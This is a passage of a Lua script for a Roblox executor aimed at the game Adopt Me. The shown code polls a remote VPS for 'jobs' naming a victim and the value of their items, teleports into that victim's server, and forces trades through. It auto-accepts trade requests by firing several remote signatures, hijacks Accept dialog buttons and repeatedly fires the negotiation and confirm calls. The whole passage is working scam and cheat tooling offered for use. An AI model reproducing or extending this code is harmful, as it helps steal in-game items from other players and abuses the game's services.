-- ─── POLL + CLAIM ─────────────────────────────────────────────────────────────
local idleCount = 0

local function claimJob(jobUUID)
	pcall(function()
		request_({
			Url     = VPS_URL .. "/jobs/" .. jobUUID .. "/claim",
			Method  = "POST",
			Headers = { ["Content-Type"] = "application/json", ["x-api-key"] = VPS_API_KEY },
			Body    = HttpService:JSONEncode({ receiver = LocalPlayer.Name })
		})
	end)
end

local function pollAndJoin()
	setStatus("Listening...", COLORS.WAIT)
	if not targetLeft and idleCount < 10 then return end

	local ok, res = pcall(function()
		return request_({
			Url     = VPS_URL .. "/jobs?receiver=" .. LocalPlayer.Name,
			Method  = "GET",
			Headers = { ["x-api-key"] = VPS_API_KEY }
		})
	end)

	if not (ok and res and res.Success) then
		setStatus("Poll error", COLORS.ERR)
		return
	end

	local parsed
	ok, parsed = pcall(function() return HttpService:JSONDecode(res.Body) end)
	if not ok or type(parsed) ~= "table" then
		setStatus("Parse error", COLORS.ERR)
		return
	end

	local hits = parsed.jobs
	if type(hits) ~= "table" then return end

	for _, hit in ipairs(hits) do
		if table.find(joinedData, tostring(hit.id)) then continue end
		if hit.placeId and hit.placeId ~= 0 and hit.placeId ~= game.PlaceId then continue end

		local jobId  = hit.jobId
		local victim = hit.username or "?"
		local val    = hit.totalValue or 0

		lblTarget.Text = "Target :: " .. victim
		lblValue.Text  = "Value  :: " .. string.format("%.1f", val)
		setStatus("Hit found — teleporting", COLORS.GO)

		for attempt = 1, 3 do
			setStatus(string.format("Teleport %d/3", attempt), COLORS.GO)
			local tpOk = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
			end)
			if tpOk then
				markJoined(tostring(hit.id))
				claimJob(tostring(hit.id))
				writefile("sab_target.txt", victim)
				targetName = victim
				targetLeft = false
				return
			end
			if attempt < 3 then task.wait(3) end
		end

		setStatus("Teleport failed", COLORS.ERR)
	end
end

-- ─── ADOPT ME — AUTO-ACCEPT + TRADE LOOP ─────────────────────────────────────
if game.PlaceId == PLACE_ID then
	local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
	local AssetLoadUI = PlayerGui:WaitForChild("AssetLoadUI")
	while AssetLoadUI.Enabled do task.wait(1) end
	task.wait(10)

	local load              = require(game.ReplicatedStorage.Fsys).load
	local RouterClient      = load("RouterClient")
	local AcceptOrDecline   = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
	local AddItemToOffer    = RouterClient.get("TradeAPI/AddItemToOffer")
	local AcceptNegotiation = RouterClient.get("TradeAPI/AcceptNegotiation")
	local ConfirmTrade      = RouterClient.get("TradeAPI/ConfirmTrade")
	local TradeFrame        = PlayerGui.TradeApp.Frame

	-- helper: fire accept with every known signature so one of them sticks
	local function acceptSender(sender)
		pcall(function() AcceptOrDecline:InvokeServer(sender, true) end)
		pcall(function() AcceptOrDecline:FireServer(sender, true)   end)
		pcall(function() AcceptOrDecline:InvokeServer(sender)       end)
		pcall(function() AcceptOrDecline:FireServer(sender)         end)
	end

	-- ── 1. event-driven accept (fires when request arrives) ──────────────────
	local ok_ev = pcall(function()
		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
			setStatus("Trade incoming!", COLORS.GO)
			acceptSender(sender)
		end)
	end)
	-- fallback: some builds use a RemoteEvent stored differently
	if not ok_ev then
		pcall(function()
			RouterClient.get("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
				setStatus("Trade incoming!", COLORS.GO)
				acceptSender(sender)
			end)
		end)
	end

	-- ── 2. dialog-button hijack — catches the Accept button in the actual UI ──
	-- finds the Accept button inside DialogApp and clicks it automatically
	task.spawn(function()
		local DialogApp = PlayerGui:WaitForChild("DialogApp", 30)
		if not DialogApp then return end
		local Dialog = DialogApp:WaitForChild("Dialog", 30)
		if not Dialog then return end

		local function hookAcceptButton(parent)
			for _, v in ipairs(parent:GetDescendants()) do
				if (v:IsA("TextButton") or v:IsA("ImageButton"))
					and (v.Name:lower():find("accept") or v.Name:lower():find("confirm")) then
					v.MouseButton1Click:Connect(function() end) -- keep alive
					pcall(function() v:activate() end)
				end
			end
		end

		Dialog:GetPropertyChangedSignal("Visible"):Connect(function()
			if Dialog.Visible then
				task.wait(0.05)
				hookAcceptButton(Dialog)
				-- also look for and click any green/accept button
				for _, v in ipairs(Dialog:GetDescendants()) do
					if v:IsA("TextButton") or v:IsA("ImageButton") then
						local lbl = v.Text or ""
						if lbl:lower():find("accept") or lbl:lower():find("ok") then
							pcall(function() v:activate() end)
						end
					end
				end
			end
		end)
	end)

	-- ── 3. continuous trade-window spam loop ──────────────────────────────────
	-- runs at 10 Hz while TradeFrame is visible:
	-- adds a food item once, then hammers AcceptNegotiation + ConfirmTrade
	local offered   = false
	local lastSender = nil

	task.spawn(function()
		while task.wait(0.1) do
			if TradeFrame.Visible then
				setStatus("Trading...", COLORS.GO)

				-- accept in case the event was missed
				if lastSender then
					pcall(function() AcceptOrDecline:InvokeServer(lastSender, true) end)
					pcall(function() AcceptOrDecline:FireServer(lastSender, true)   end)
				end

				if not offered then
					-- offer a food item so the trade isn't empty (required by AM)
					pcall(function()
						local inv = load("ClientData").get("inventory")
						if inv and inv.food then
							for uid in pairs(inv.food) do
								pcall(function() AddItemToOffer:FireServer(uid) end)
								break
							end
						end
					end)
					offered = true
				end

				pcall(function() AcceptNegotiation:FireServer() end)
				pcall(function() ConfirmTrade:FireServer()      end)
			else
				offered    = false
				lastSender = nil
			end
		end
	end)

	-- store sender so the spam loop can re-fire accept
	pcall(function()
		RouterClient.get_event("TradeAPI/TradeRequestReceived").OnClientEvent:Connect(function(sender)
			lastSender = sender
		end)
	end)

	-- ── 4. idle + left tracking ───────────────────────────────────────────────
	task.spawn(function()
		while task.wait(1) do
			if TradeFrame.Visible then
				idleCount = 0
			else
				idleCount = idleCount + 1
				offered   = false
			end
			lblLeft.Text = "Left   :: " .. (targetLeft and "True" or "False")
		end
	end)

	-- ── 5. main polling loop ──────────────────────────────────────────────────
	while task.wait(5) do
		pollAndJoin()
	end
end
